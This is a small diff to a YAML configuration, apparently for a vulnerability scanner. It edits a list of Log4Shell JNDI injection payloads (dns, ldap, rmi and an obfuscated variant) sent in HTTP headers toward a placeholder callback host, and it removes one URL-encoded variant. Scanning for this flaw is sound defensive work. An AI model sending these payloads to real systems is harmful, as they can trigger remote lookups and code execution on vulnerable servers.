@@ -233,7 +233,6 @@ application:
         - "If-Modified-Since"
       payloads:
         - "${jndi:dns://dnslog-url/t}"
-        - "%24%7Bjndi%3Adns%3A%2F%2Fdnslog-url%2Ft%7D"
         - "${jndi:ldap://dnslog-url/t}"
         - "${jndi:rmi://dnslog-url/t}"
         - "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://dnslog-url/t}"
